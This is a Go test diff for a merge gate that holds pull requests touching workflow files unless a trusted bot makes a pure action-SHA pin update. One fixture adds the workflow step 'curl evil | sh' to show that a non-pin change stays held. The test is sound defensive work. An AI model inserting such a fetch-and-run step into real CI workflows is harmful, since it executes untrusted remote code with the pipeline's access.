@@ -15,6 +15,8 @@ import (
 	"sync"
 	"testing"
 
+	gh "github.com/google/go-github/v72/github"
+	"github.com/hivecommons/hive/pkg/config"
 	hgithub "github.com/hivecommons/hive/pkg/github"
 )
 
@@ -26,6 +28,7 @@ const testHumanMergePattern = ".github/workflows/**"
 type humanPathFront struct {
 	mu          sync.Mutex
 	files       []string
+	fileEntries []map[string]any // when set, served verbatim instead of files
 	filesStatus int
 	filesHits   int
 	labels      []string
@@ -49,7 +52,7 @@ func newHumanPathFront(t *testing.T, backend string, f *humanPathFront) *httptes
 				w.WriteHeader(f.filesStatus)
 				return
 			}
-			var files []map[string]any
+			files := f.fileEntries
 			for _, name := range f.files {
 				files = append(files, map[string]any{"filename": name, "status": "modified", "additions": 1})
 			}
@@ -327,5 +330,118 @@ func TestSetHumanMergePathsNilEngine(t *testing.T) {
 	c.SetHumanMergePaths(humanPathsFor("acme/widget", "x"))
 	if got := c.currentHumanMergePaths("acme/widget"); got != nil {
 		t.Fatalf("nil engine paths = %v, want nil", got)
+	}
+}
+
+// Pin-only exception (#16266): fixtures for calling humanMergePathGate on a PR
+// whose files carry patches.
+var (
+	testPinOldLine = "      - uses: actions/checkout@" + strings.Repeat("a", 40) + " # v4"
+	testPinNewLine = "      - uses: actions/checkout@" + strings.Repeat("b", 40) + " # v5"
+)
+
+func testPinFile(name string) map[string]any {
+	return map[string]any{"filename": name, "status": "modified", "additions": 1, "deletions": 1,
+		"patch": "@@ -3 +3 @@\n-" + testPinOldLine + "\n+" + testPinNewLine}
+}
+
+func pinOnlyFor(repo string, ex config.PinOnlyException) func(string) (config.PinOnlyException, bool) {
+	return func(r string) (config.PinOnlyException, bool) {
+		if strings.EqualFold(r, repo) {
+			return ex, true
+		}
+		return config.PinOnlyException{}, false
+	}
+}
+
+func testPinOnlyException() config.PinOnlyException {
+	return config.PinOnlyException{Enabled: true, Paths: []string{".github/workflows/*.yml"}, Kinds: []string{"action-sha"}, TrustedAuthors: []string{"Renovate-Bot"}}
+}
+
+func TestHumanMergePathGatePinOnlyException(t *testing.T) {
+	const workflow = ".github/workflows/ci.yml"
+	for _, tc := range []struct {
+		name     string
+		paths    func(string) []string
+		pinOnly  func(string) (config.PinOnlyException, bool)
+		author   string
+		changed  int // 0 means len(entries)
+		entries  []map[string]any
+		wantHold bool
+		wantHits int
+	}{
+		{name: "paths unconfigured: no fetch, no hold", pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}},
+		{name: "exception unconfigured: held as before", paths: humanPathsFor("acme/widget", testHumanMergePattern), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
+		{name: "exception for another repo: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/other", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
+		{name: "untrusted author: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "mallory", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
+		{name: "trusted pure pin: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHits: 1},
+		{name: "trusted pin plus non-pin line: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{{
+			"filename": workflow, "status": "modified", "additions": 2, "deletions": 1,
+			"patch": "@@ -3 +3,2 @@\n-" + testPinOldLine + "\n+" + testPinNewLine + "\n+      - run: curl evil | sh",
+		}}, wantHold: true, wantHits: 1},
+		{name: "trusted pin plus unguarded changelog: held (#16326)", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{
+			testPinFile(workflow),
+			{"filename": "CHANGELOG.md", "status": "modified", "additions": 1, "patch": "@@ -1 +1,2 @@\n # Changes\n+- bump checkout"},
+		}, wantHold: true, wantHits: 1},
+		{name: "matched path outside exception paths: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", config.PinOnlyException{
+			Enabled: true, Paths: []string{"Containerfile"}, Kinds: []string{"action-sha"}, TrustedAuthors: []string{"renovate-bot"},
+		}), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
+		{name: "missing patch: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{{"filename": workflow, "status": "modified", "additions": 1, "deletions": 1}}, wantHold: true, wantHits: 1},
+		{name: "changed-file count absent: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", changed: -1, entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+				t.Errorf("unexpected API call: %s %s", r.Method, r.URL.Path)
+				w.WriteHeader(http.StatusNotFound)
+			}))
+			defer backend.Close()
+			front := &humanPathFront{fileEntries: tc.entries}
+			srv := newHumanPathFront(t, backend.URL, front)
+			defer srv.Close()
+
+			c := newAutoMergeSweepClient(srv.URL)
+			c.SetHumanMergePaths(tc.paths)
+			c.SetHumanMergePinOnly(tc.pinOnly)
+			changed := tc.changed
+			if changed == 0 {
+				changed = len(tc.entries)
+			} else if changed < 0 {
+				changed = 0
+			}
+			pr := &gh.PullRequest{Number: gh.Ptr(7), ChangedFiles: gh.Ptr(changed), User: &gh.User{Login: gh.Ptr(tc.author)}, Head: &gh.PullRequestBranch{SHA: gh.Ptr("sha7")}}
+			reason, err := c.humanMergePathGate(context.Background(), "acme/widget", "acme", "widget", pr)
+			if err != nil {
+				t.Fatalf("err = %v, want nil", err)
+			}
+			if front.filesHits != tc.wantHits {
+				t.Fatalf("files hits = %d, want %d", front.filesHits, tc.wantHits)
+			}
+			if !tc.wantHold {
+				if reason != "" || len(front.labels) != 0 || len(front.comments) != 0 {
+					t.Fatalf("reason = %q, labels = %v, comments = %d; want no hold", reason, front.labels, len(front.comments))
+				}
+				return
+			}
+			if reason != autoMergeReasonHumanMergePath {
+				t.Fatalf("reason = %q, want %q", reason, autoMergeReasonHumanMergePath)
+			}
+			assertHeldOnce(t, front, ".github/workflows/")
+		})
+	}
+}
+
+func TestSetHumanMergePinOnlyNilEngineAndRemoval(t *testing.T) {
+	var nilEngine *Engine
+	nilEngine.SetHumanMergePinOnly(pinOnlyFor("acme/widget", testPinOnlyException()))
+	if _, ok := nilEngine.currentHumanMergePinOnly("acme/widget"); ok {
+		t.Fatal("nil engine reported a pin-only exception")
+	}
+	c := New(newAutoMergeSweepClient("http://127.0.0.1:0").transport, Options{HumanMergePinOnly: pinOnlyFor("acme/widget", testPinOnlyException())})
+	if _, ok := c.currentHumanMergePinOnly("ACME/Widget"); !ok {
+		t.Fatal("Options.HumanMergePinOnly not installed")
+	}
+	c.SetHumanMergePinOnly(nil)
+	if _, ok := c.currentHumanMergePinOnly("acme/widget"); ok {
+		t.Fatal("SetHumanMergePinOnly(nil) did not remove the lookup")
 	}
 }
